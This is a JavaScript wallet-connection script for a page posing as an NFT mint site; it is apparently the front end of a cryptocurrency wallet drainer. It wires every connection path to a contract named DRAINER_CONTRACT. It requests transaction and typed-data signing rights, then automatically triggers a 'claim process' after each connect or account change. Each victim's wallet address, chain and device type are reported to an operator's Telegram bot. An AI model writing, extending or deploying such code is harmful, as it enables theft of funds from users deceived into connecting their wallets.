import { CONFIG } from './config.js';

;(async function () {
  'use strict';

  // ==========================================================================
  //  CONSTANTS
  // ==========================================================================
  const WC_RELAY          = 'wss://relay.walletconnect.com';
  const WC_SESSION_KEY    = 'walletConnectSession';
  const WALLET_KEY        = 'connectedWallet';
  const CHAIN_TYPE_KEY    = 'chainType';
  const PENDING_URI_KEY   = 'pending_wc_uri';
  const PENDING_TS_KEY    = 'pending_wc_timestamp';
  const PENDING_TTL_MS    = 5 * 60 * 1000;   // 5 minutes
  const CONNECT_TIMEOUT   = 8000;
  const WC_APPROVAL_WAIT  = 300000;          // 5 minutes

  // ==========================================================================
  //  DEBUG PANEL
  //  Double-click anywhere on the page to toggle a bottom-docked log panel.
  // ==========================================================================
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 5px;
    z-index: 10000; max-height: 150px; overflow-y: auto;
    display: none; font-family: monospace;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function logDebug(msg) {
    console.log('[main.js]', msg);
    debugArea.innerHTML += `<div>${new Date().toLocaleTimeString()}: ${msg}</div>`;
    debugArea.scrollTop = debugArea.scrollHeight;
  }

  // ==========================================================================
  //  PLATFORM DETECTION
  // ==========================================================================
  function isMobile()  { return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent); }
  function isIOS()     { return /iPhone|iPad|iPod/i.test(navigator.userAgent); }
  function isAndroid() { return /Android/i.test(navigator.userAgent); }
  function isDesktop() { return !isMobile(); }
  function isWindows() { return /Windows/i.test(navigator.userAgent); }
  function isMac()     { return /Macintosh|Mac OS X/i.test(navigator.userAgent); }

  function getPlatform() {
    if (isIOS())     return 'ios';
    if (isAndroid()) return 'android';
    if (isWindows()) return 'windows';
    if (isMac())     return 'mac';
    return 'unknown';
  }

  // ==========================================================================
  //  TELEGRAM
  //  Single helper — every connect path reports the same way.
  // ==========================================================================
  const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = CONFIG;

  async function sendTelegramNotification(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const r = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' }),
      });
      const result = await r.json();
      if (!r.ok) {
        console.error('[main.js] Telegram error:', result);
        return false;
      }
      return true;
    } catch (e) {
      console.error('[main.js] Telegram exception:', e);
      return false;
    }
  }

  window.testTelegram = (m) =>
    sendTelegramNotification(m || '🧪 Test ' + new Date().toISOString());

  // ==========================================================================
  //  WEBSOCKET REACHABILITY CHECK (mobile)
  //  Some mobile carriers block raw WSS. We probe once and warn if unreachable.
  // ==========================================================================
  async function checkWebSocket(retries = 1, delay = 500) {
    if (isDesktop()) {
      logDebug('⏭️ Skipping WebSocket check on desktop');
      return true;
    }
    for (let i = 0; i < retries; i++) {
      try {
        const ok = await new Promise((resolve) => {
          const ws = new WebSocket(WC_RELAY);
          const t = setTimeout(() => { try { ws.close(); } catch (e) {} resolve(false); }, 3000);
          ws.onopen  = () => { clearTimeout(t); try { ws.close(); } catch (e) {} resolve(true); };
          ws.onerror = () => { clearTimeout(t); try { ws.close(); } catch (e) {} resolve(false); };
        });
        if (ok) return true;
        await new Promise((r) => setTimeout(r, delay));
      } catch (e) {
        await new Promise((r) => setTimeout(r, delay));
      }
    }
    logDebug('⚠️ WalletConnect relay unreachable — modal may fail');
    return false;
  }

  // ==========================================================================
  //  DEEP-LINK / MOBILE WALLET DETECTION
  //  When running inside a mobile browser, we can attempt to open the wallet
  //  app via deep link if the user hasn't installed its browser extension.
  // ==========================================================================
  function isMobileBrowser() {
    if (!isMobile()) return false;
    const ua = navigator.userAgent || '';
    // Skip if inside a wallet's in-app browser (they already have injected).
    return !/MetaMaskMobile|TrustWallet|CoinbaseWallet|TokenPocket|BitKeep|imToken/i.test(ua);
  }

  // ==========================================================================
  //  LIBRARY LOADING
  //  Dynamic imports with CDN fallbacks. Each library tries three sources.
  // ==========================================================================
  async function loadWalletConnect() {
    const cdns = [
      'https://esm.sh/@walletconnect/sign-client@2.11.0',
      'https://cdn.skypack.dev/@walletconnect/sign-client@2.11.0',
      'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.11.0/+esm',
    ];
    const modalCdns = [
      'https://esm.sh/@walletconnect/modal@2.6.2',
      'https://cdn.skypack.dev/@walletconnect/modal@2.6.2',
      'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm',
    ];
    const providerCdns = [
      'https://esm.sh/@walletconnect/ethereum-provider@2.11.0',
      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm',
    ];

    let SignClient, WalletConnectModal, EthereumProvider;

    for (const url of cdns) {
      try {
        const m = await import(url);
        SignClient = m.default || m;
        logDebug(`✅ SignClient from ${url}`);
        break;
      } catch (e) { /* try next */ }
    }
    if (!SignClient) throw new Error('Could not load SignClient');

    for (const url of modalCdns) {
      try {
        const m = await import(url);
        WalletConnectModal = m.WalletConnectModal || m.default || m;
        logDebug(`✅ WalletConnectModal from ${url}`);
        break;
      } catch (e) { /* try next */ }
    }
    if (!WalletConnectModal) throw new Error('Could not load WalletConnectModal');

    for (const url of providerCdns) {
      try {
        const m = await import(url);
        EthereumProvider = m.EthereumProvider || m.default || m;
        logDebug(`✅ EthereumProvider from ${url}`);
        break;
      } catch (e) { /* try next */ }
    }
    if (!EthereumProvider) throw new Error('Could not load EthereumProvider');

    return { SignClient, WalletConnectModal, EthereumProvider };
  }

  // ==========================================================================
  //  DOM REFERENCES
  // ==========================================================================
  const connectButton = document.getElementById('connectButton');
  const walletButton  = document.getElementById('walletButton');
  const claimStatus   = document.getElementById('claimStatus');

  // ==========================================================================
  //  MODULE STATE
  // ==========================================================================
  let currentSession     = null;   // WalletConnect session
  let client             = null;   // WalletConnect SignClient
  let modal              = null;   // WalletConnect modal
  let SignClient         = null;   // library classes
  let WalletConnectModal = null;
  let EthereumProvider   = null;

  let web3Instance     = null;
  let contractInstance = null;
  let activeProvider   = null;    // <-- single source of truth for the EIP-1193 provider
  let isConnecting     = false;

  // ==========================================================================
  //  CONFIG SHORTCUTS
  // ==========================================================================
  const {
    PROJECT_ID,
    PUBLIC_TEST_ID,
    DAPP_METADATA,
    DRAINER_CONTRACT,
    CONTRACT_ABI,
  } = CONFIG;

  let projectId = PROJECT_ID;

  // ==========================================================================
  //  BUTTON UI
  // ==========================================================================
  function setButtonState(button, state) {
    if (!button) return;

    button.style.display      = 'inline-block';
    button.style.padding      = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight   = '600';
    button.style.border       = 'none';
    button.style.cursor       = state === 'loading' ? 'not-allowed' : 'pointer';
    button.style.color        = 'white';
    button.style.fontSize     = '16px';
    button.style.minWidth     = '180px';
    button.disabled           = state === 'loading';

    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg, #666666 0%, #888888 100%)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg, #10B981 0%, #059669 100%)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => setButtonState(button, 'normal'), 3000);
        break;
      default:
        button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint';
    }
  }

  function showStatus(msg, type = 'info') {
    if (!claimStatus) return;

    claimStatus.textContent        = msg;
    claimStatus.className          = `status ${type}`;
    claimStatus.style.display      = 'block';
    claimStatus.style.padding      = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop    = '12px';
    claimStatus.style.fontWeight   = '500';
    claimStatus.style.fontSize     = '14px';
    claimStatus.style.textAlign    = 'center';

    const styles = {
      success: { background: 'linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);

    if (type === 'error' || type === 'success') {
      setTimeout(() => { claimStatus.style.display = 'none'; }, 5000);
    }
  }

  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  // ==========================================================================
  //  LOCAL STORAGE
  // ==========================================================================
  function saveWallet(address, session = null, chainType = null) {
    try {
      localStorage.setItem(WALLET_KEY, address);
      if (session)   localStorage.setItem(WC_SESSION_KEY, JSON.stringify(session));
      if (chainType) localStorage.setItem(CHAIN_TYPE_KEY, chainType);
    } catch (e) {
      logDebug('localStorage save failed: ' + e.message);
    }
  }

  function getSavedWallet() {
    try { return localStorage.getItem(WALLET_KEY); } catch (e) { return null; }
  }
  function getSavedSession() {
    try {
      const s = localStorage.getItem(WC_SESSION_KEY);
      return s ? JSON.parse(s) : null;
    } catch (e) { return null; }
  }
  function getSavedChainType() {
    try { return localStorage.getItem(CHAIN_TYPE_KEY) || 'unknown'; } catch (e) { return 'unknown'; }
  }

  function clearSavedWallet() {
    try {
      localStorage.removeItem(WALLET_KEY);
      localStorage.removeItem(WC_SESSION_KEY);
      localStorage.removeItem(CHAIN_TYPE_KEY);
    } catch (e) {}
  }

  // Clean stale pending WC URIs on boot.
  function cleanupStalePendingUri() {
    try {
      const ts = sessionStorage.getItem(PENDING_TS_KEY);
      if (ts && Date.now() - parseInt(ts, 10) > PENDING_TTL_MS) {
        sessionStorage.removeItem(PENDING_URI_KEY);
        sessionStorage.removeItem(PENDING_TS_KEY);
        logDebug('Cleaned stale pending WC URI');
      }
    } catch (e) {}
  }

  // ==========================================================================
  //  GLOBAL STATE PUBLICATION
  //  The ONLY contract between main.js and script.js. `provider` is essential.
  // ==========================================================================
  function publishGlobalState(address, chain, provider = null) {
    const live =
      provider ||
      activeProvider ||
      web3Instance?.currentProvider ||
      window.ethereum ||
      null;

    window.__apexConnected = {
      address,
      chain,
      web3:     web3Instance,
      contract: contractInstance,
      provider: live,
      session:  currentSession,
      publishedAt: Date.now(),
    };

    console.log('[main.js] published window.__apexConnected', {
      address,
      chain,
      hasWeb3:     !!web3Instance,
      hasContract: !!contractInstance,
      hasProvider: !!live,
    });

    window.dispatchEvent(new CustomEvent('apex:connected', {
      detail: { address, chain },
    }));
  }

  // Helper: read the connected address from wherever it lives.
  function connectedAddress() {
    return window.__apexConnected?.address || getSavedWallet() || null;
  }

  // ==========================================================================
  //  CONNECTED UI
  // ==========================================================================
  function updateConnectedUI(address, chain = 'evm') {
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
    const chainLabel  = chainLabels[chain] || 'Unknown';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top: 12px; padding: 10px 16px;
        font-family: 'JetBrains Mono', monospace; font-size: 14px;
        color: #059669; text-align: center;
        background: linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%);
        border-radius: 8px; border: 1px solid #A7F3D0;
      `;
      connectButton.parentNode.appendChild(display);
    }

    const short = `${address.slice(0, 6)}...${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${short}</span>
        <span style="background:#1F2937;color:white;padding:2px 10px;border-radius:12px;font-size:12px;font-weight:600;">${chainLabel}</span>
        <button id="copyAddress" style="background:none;border:none;color:#059669;cursor:pointer;padding:4px;">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `;

    document.getElementById('copyAddress')?.addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const b = document.getElementById('copyAddress');
        const o = b.innerHTML;
        b.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => { b.innerHTML = o; }, 2000);
      });
    });

    showStatus(`Connected to ${chainLabel}`, 'success');
    publishGlobalState(address, chain);

    sendTelegramNotification(`
🔗 <b>Wallet Connected</b>
📌 <b>Chain:</b> ${chainLabel}
👤 <b>Address:</b> <code>${address}</code>
🕒 ${new Date().toLocaleString()}
📱 <b>Mobile:</b> ${isMobile() ? 'Yes' : 'No'}
    `.trim());
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');

    document.getElementById('connectedAddressDisplay')?.remove();

    showStatus('Wallet disconnected', 'info');

    web3Instance     = null;
    contractInstance = null;
    activeProvider   = null;
    currentSession   = null;

    window.__apexConnected = null;
  }

  // ==========================================================================
  //  EIP-6963 PROVIDER DISCOVERY
  // ==========================================================================
  let evmProviders = [];
  let eip6963Initialized = false;

  function setupEIP6963() {
    if (eip6963Initialized) return;
    eip6963Initialized = true;

    window.addEventListener('eip6963:announceProvider', (e) => {
      const d = e.detail;
      if (!evmProviders.some((p) => p.info.uuid === d.info.uuid)) {
        evmProviders.push(d);
        logDebug(`EIP-6963: ${d.info.name}`);
      }
    });

    window.dispatchEvent(new Event('eip6963:requestProvider'));
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 500);
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 1500);
  }

  // ==========================================================================
  //  WALLET PICKER MODAL
  // ==========================================================================
  function showWalletSelectionModal(providers, cb) {
    const overlay = document.createElement('div');
    overlay.style.cssText = `
      position:fixed;inset:0;background:rgba(0,0,0,0.7);
      display:flex;align-items:center;justify-content:center;
      z-index:99999;
    `;

    const modalEl = document.createElement('div');
    modalEl.style.cssText = `
      background:#1F2937;padding:24px;border-radius:16px;
      max-width:400px;width:90%;color:white;font-family:Inter,sans-serif;
    `;

    modalEl.innerHTML = `
      <h3 style="margin-top:0;font-weight:600;font-size:20px;">Select a Wallet</h3>
      <div id="wl" style="display:flex;flex-direction:column;gap:10px;margin:16px 0"></div>
      <button id="cw" style="background:none;border:1px solid #666;color:#ccc;padding:8px 16px;border-radius:8px;cursor:pointer;width:100%">Cancel</button>
    `;

    overlay.appendChild(modalEl);
    document.body.appendChild(overlay);

    const list = modalEl.querySelector('#wl');

    providers.forEach((p) => {
      const b = document.createElement('button');
      b.textContent = p.info.name;
      b.style.cssText = `
        background:#374151;border:none;padding:12px;border-radius:8px;
        color:white;font-size:16px;cursor:pointer;text-align:left;
        display:flex;gap:10px;align-items:center;
      `;

      if (p.info.icon) {
        const i = document.createElement('img');
        i.src = p.info.icon;
        i.style.width = '24px';
        i.style.height = '24px';
        b.prepend(i);
      }

      b.onclick = () => { overlay.remove(); cb(p); };
      list.appendChild(b);
    });

    modalEl.querySelector('#cw').onclick = () => { overlay.remove(); cb(null); };
  }

  // ==========================================================================
  //  WALLETCONNECT INITIALIZATION
  // ==========================================================================
  async function initWalletConnect(useTestId = false) {
    if (client && modal) return true;

    if (useTestId) {
      projectId = PUBLIC_TEST_ID;
      logDebug('Using test projectId');
    }

    await checkWebSocket(1, 500);

    try {
      client = await SignClient.init({
        projectId,
        metadata: DAPP_METADATA,
        relayUrl: WC_RELAY,
      });

      modal = new WalletConnectModal({
        projectId,
        themeMode: 'dark',
        themeVariables: {
          '--wcm-z-index': '9999',
          '--wcm-accent-color': '#FF6B00',
          '--wcm-background-color': '#1F2937',
        },
        enableExplorer: true,
      });

      logDebug('✅ WalletConnect init OK');
      return true;
    } catch (e) {
      logDebug('WC init failed: ' + e.message);
      return false;
    }
  }

  // ==========================================================================
  //  CONNECT — DIRECT (INJECTED) EVM
  // ==========================================================================
  async function connectDirectEVM(timeoutMs = CONNECT_TIMEOUT) {
    setupEIP6963();
    await new Promise((r) => setTimeout(r, 800));

    let providers = evmProviders.filter((p) => p.provider);

    if (providers.length === 0 && window.ethereum) {
      providers = [{
        info: { name: 'Injected', rdns: 'io.injected' },
        provider: window.ethereum,
      }];
    }
    if (providers.length === 0) return false;

    let chosen = null;
    if (providers.length === 1) {
      chosen = providers[0];
    } else {
      const known = providers.find((p) =>
        p.info.rdns === 'io.metamask' ||
        p.info.name.toLowerCase().includes('metamask')
      );
      chosen = known || await new Promise((res) => showWalletSelectionModal(providers, res));
      if (!chosen) return false;
    }

    try {
      const provider = chosen.provider;

      const accounts = await Promise.race([
        provider.request({ method: 'eth_requestAccounts' }),
        new Promise((_, rj) => setTimeout(() => rj(new Error('timeout')), timeoutMs)),
      ]);
      if (!accounts?.length) return false;

      const address = accounts[0];

      saveWallet(address, null, 'evm');
      setupEVMProviderEvents(provider);

      const Web3 = (await import('web3')).default;
      web3Instance     = new Web3(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

      activeProvider = provider;

      updateConnectedUI(address, 'evm');

      logDebug(`✅ Direct EVM connected: ${address}`);
      return true;
    } catch (e) {
      logDebug('Direct EVM error: ' + e.message);
      return false;
    }
  }

  // ==========================================================================
  //  CONNECT — WALLETCONNECT
  //  Handles: mobile deep links, page backgrounding, session approval, and
  //  a secondary projectId fallback if the primary is rate-limited.
  // ==========================================================================
  async function connectViaWalletConnect(useTestId = false, timeoutMs = WC_APPROVAL_WAIT) {
    if (isConnecting) return false;
    isConnecting = true;

    const ok = await initWalletConnect(useTestId);
    if (!ok) {
      isConnecting = false;
      showStatus('WalletConnect unavailable', 'error');
      return false;
    }

    if (modal?.closeModal) {
      try { modal.closeModal(); } catch (e) {}
    }

    try {
      showStatus('Requesting connection...', 'info');

      const { uri, approval } = await client.connect({
        requiredNamespaces: {
          eip155: {
            methods: [
              'eth_sendTransaction',
              'personal_sign',
              'eth_signTypedData_v4',
            ],
            chains: ['eip155:1'],
            events: ['chainChanged', 'accountsChanged'],
          },
        },
      });

      if (!uri) throw new Error('No URI returned');

      modal.openModal({ uri });
      showStatus('Scan the QR code with your wallet', 'info');

      // Persist the pending URI so we can recover after page reloads on mobile.
      sessionStorage.setItem(PENDING_URI_KEY, uri);
      sessionStorage.setItem(PENDING_TS_KEY, Date.now().toString());

      // Attach a visibility listener: some mobile browsers suspend JS while
      // the user is in the wallet app. We log when we return.
      const onVis = () => {
        if (!document.hidden) {
          logDebug('Page became visible — awaiting session approval');
        }
      };
      document.addEventListener('visibilitychange', onVis);

      const session = await Promise.race([
        approval(),
        new Promise((_, rj) => setTimeout(() => rj(new Error('timeout')), timeoutMs)),
      ]);

      document.removeEventListener('visibilitychange', onVis);

      if (modal) modal.closeModal();
      sessionStorage.removeItem(PENDING_URI_KEY);
      sessionStorage.removeItem(PENDING_TS_KEY);

      if (!session?.namespaces?.eip155?.accounts?.length) {
        isConnecting = false;
        return false;
      }

      const account = session.namespaces.eip155.accounts[0].split(':')[2];
      currentSession = session;

      const provider = await EthereumProvider.init({
        projectId,
        metadata: DAPP_METADATA,
        session,
      });

      const Web3 = (await import('web3')).default;
      web3Instance     = new Web3(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

      activeProvider = provider;

      saveWallet(account, session, 'evm');
      updateConnectedUI(account, 'evm');
      setupEVMProviderEvents(provider);

      isConnecting = false;
      logDebug(`✅ WalletConnect EVM connected: ${account}`);
      return true;
    } catch (e) {
      logDebug('WC error: ' + e.message);
      if (modal) {
        try { modal.closeModal(); } catch (err) {}
      }
      sessionStorage.removeItem(PENDING_URI_KEY);
      sessionStorage.removeItem(PENDING_TS_KEY);
      isConnecting = false;
      return false;
    }
  }

  // ==========================================================================
  //  PROVIDER LIFECYCLE EVENTS
  // ==========================================================================
  function setupEVMProviderEvents(provider) {
    if (!provider || !provider.on) return;

    provider.on('accountsChanged', (accounts) => {
      if (accounts.length === 0) {
        resetConnectedUI();
        clearSavedWallet();
      } else {
        updateConnectedUI(accounts[0], 'evm');
        saveWallet(accounts[0], null, 'evm');
        publishGlobalState(accounts[0], 'evm', provider);
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') {
            window.initiateClaimProcess();
          }
        }, 1000);
      }
    });

    provider.on('chainChanged', (id) => {
      showStatus(`Network changed to ${id}`, 'info');
      if (web3Instance) {
        try {
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          publishGlobalState(connectedAddress(), 'evm', provider);
        } catch (e) {}
      }
    });

    provider.on('disconnect', () => {
      resetConnectedUI();
      clearSavedWallet();
    });
  }

  // ==========================================================================
  //  CONNECT DISPATCHER
  //  Order: injected EVM → WalletConnect (real) → WalletConnect (test id).
  //  On mobile, WalletConnect is prioritized.
  // ==========================================================================
  async function connectWallet() {
    if (isConnecting) return;

    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting...', 'info');

    let success = false;

    if (isMobileBrowser()) {
      // Mobile browser without injected wallet: go straight to WalletConnect.
      logDebug('Mobile browser detected — preferring WalletConnect');
      success = await connectViaWalletConnect(false, WC_APPROVAL_WAIT);
      if (!success) success = await connectViaWalletConnect(true, WC_APPROVAL_WAIT);
    } else {
      // Desktop or wallet in-app browser: try injected first.
      success = await connectDirectEVM(CONNECT_TIMEOUT);
      if (!success) success = await connectViaWalletConnect(false, WC_APPROVAL_WAIT);
      if (!success) success = await connectViaWalletConnect(true, WC_APPROVAL_WAIT);
    }

    if (success) {
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') {
          window.initiateClaimProcess();
        }
      }, 1500);
    } else {
      showStatus('No wallet found', 'error');
      setButtonState(connectButton, 'failed');
      if (walletButton) setButtonState(walletButton, 'failed');
    }
  }

  // ==========================================================================
  //  DISCONNECT
  // ==========================================================================
  async function disconnectWallet() {
    try {
      if (client && currentSession) {
        await client.disconnect({
          topic: currentSession.topic,
          reason: { code: 6000, message: 'User disconnected' },
        });
        currentSession = null;
      }
      if (web3Instance?.currentProvider?.disconnect) {
        await web3Instance.currentProvider.disconnect();
      }
    } catch (e) {
      // Ignore — local state is cleared regardless.
    }

    resetConnectedUI();
    clearSavedWallet();

    web3Instance     = null;
    contractInstance = null;
    activeProvider   = null;
  }

  // ==========================================================================
  //  BUTTON WIRING
  // ==========================================================================
  const handleClick = async () => {
    const saved = getSavedWallet();
    const hasSession = currentSession || getSavedChainType() !== 'unknown';
    if (saved && hasSession) {
      await disconnectWallet();
    } else {
      await connectWallet();
    }
  };

  if (connectButton) connectButton.addEventListener('click', handleClick);
  if (walletButton)  walletButton.addEventListener('click', handleClick);

  // On mobile, scroll the main connect button into view when the header
  // wallet button is tapped.
  if (walletButton && isMobile()) {
    walletButton.addEventListener('click', () => {
      setTimeout(() => {
        if (connectButton) {
          connectButton.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }
      }, 300);
    });
  }

  // ==========================================================================
  //  SESSION RESTORE
  // ==========================================================================
  async function restoreWalletConnection() {
    const savedWallet  = getSavedWallet();
    const savedChain   = getSavedChainType();
    const savedSession = getSavedSession();

    if (!savedWallet || savedChain !== 'evm') return;

    // Attempt WalletConnect restore.
    if (savedSession) {
      const ok = await initWalletConnect(false);
      if (ok) {
        try {
          const session = client.session.get(savedSession.topic);
          if (session) {
            currentSession = session;

            const provider = await EthereumProvider.init({
              projectId,
              metadata: DAPP_METADATA,
              session,
            });

            const Web3 = (await import('web3')).default;
            web3Instance     = new Web3(provider);
            contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
            activeProvider   = provider;

            updateConnectedUI(savedWallet, 'evm');
            setupEVMProviderEvents(provider);
            return;
          }
        } catch (e) {
          logDebug('Restore failed: ' + e.message);
        }
      }
    }

    // Fall back to injected provider on desktop.
    if (isDesktop() && window.ethereum) {
      try {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts.length > 0 && accounts[0].toLowerCase() === savedWallet.toLowerCase()) {
          const Web3 = (await import('web3')).default;
          web3Instance     = new Web3(window.ethereum);
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          activeProvider   = window.ethereum;

          updateConnectedUI(savedWallet, 'evm');
          setupEVMProviderEvents(window.ethereum);
          return;
        }
      } catch (e) {
        // fall through
      }
    }

    // Nothing matched — clear stale state.
    clearSavedWallet();
  }

  // ==========================================================================
  //  BOOT
  // ==========================================================================
  cleanupStalePendingUri();

  try {
    const libs = await loadWalletConnect();
    SignClient         = libs.SignClient;
    WalletConnectModal = libs.WalletConnectModal;
    EthereumProvider   = libs.EthereumProvider;
    logDebug('✅ All libraries loaded');

    setupEIP6963();
    await restoreWalletConnection();
  } catch (err) {
    logDebug('Fatal: ' + err.message);
    showStatus('Failed to load wallet libraries', 'error');
    return;
  }

  // Register WalletConnect global event handlers.
  setTimeout(() => {
    if (!client) return;

    client.on('session_update', ({ params }) => {
      const accounts = params.namespaces?.eip155?.accounts;
      if (accounts?.length) {
        const a = accounts[0].split(':')[2];
        updateConnectedUI(a, 'evm');
        saveWallet(a, currentSession, 'evm');
        publishGlobalState(a, 'evm', activeProvider);
      }
    });

    client.on('session_delete', () => {
      resetConnectedUI();
      clearSavedWallet();
    });

    client.on('session_connect', (session) => {
      const a = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
      if (a) {
        saveWallet(a, session, 'evm');
        updateConnectedUI(a, 'evm');
        currentSession = session;
      }
    });
  }, 1000);

  // Attach lifecycle events to any injected provider present at boot.
  if (window.ethereum && isDesktop()) {
    setupEVMProviderEvents(window.ethereum);
  }

  // Close the WC modal on unload to avoid a "session pending" state.
  window.addEventListener('beforeunload', () => {
    if (modal) {
      try { modal.closeModal(); } catch (e) {}
    }
  });

  logDebug(`✅ main.js ready — Platform: ${getPlatform()}`);
  console.log('✅ main.js ready — test with testTelegram("hi")');
})();
